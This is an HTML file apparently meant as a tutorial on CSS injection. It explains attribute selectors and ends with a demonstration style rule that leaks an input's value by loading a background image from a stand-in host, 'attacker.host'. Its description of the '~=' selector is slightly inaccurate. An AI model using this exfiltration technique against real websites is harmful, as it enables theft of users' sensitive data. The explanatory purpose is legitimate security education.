<!-- CSS (Cascading Stylesheet language) is the specification for webpage styling supported by web browsers. The elements of a website can be styled using the properties set by an external stylesheet. At runtime, the page can introspect itself to see the styles applied.

CSS has grown over time and became gradually complex. CSS injection happens when an attacker is able to place his own CSS code into a vulnerable website.  This kind of vulnerability happens when the application permits the user-generated CSS or it is possible to interfere with the stylesheets in some way.

The main impacts of CSS Injection: Cross-Site Scripting in specific conditions, UI modifications, and data exfiltration by taking out sensitive data.

CSS language provides different value selectors as shown below for selecting the elements based on the value of an attribute.

[attribute =value]: [username=abc]   - Selects all elements with username="abc"
[attribute ^=value]:[username ^=abc] - Select all elements with username attribute value starting with "abc"
[attribute $=value]:[username $=abc] - Select all elements with username attribute value ending with "abc"
[attribute ~=value]:[username ~=abc] - Select all elements with username attribute containing the value "abc"
Consider the below code snippet to understand how attackers can misuse these selectors. -->

<style>
    #username[value="john"] {
            background:url("https://attacker.host/john");
            
    }
</style>
<input id="username" value="john" />
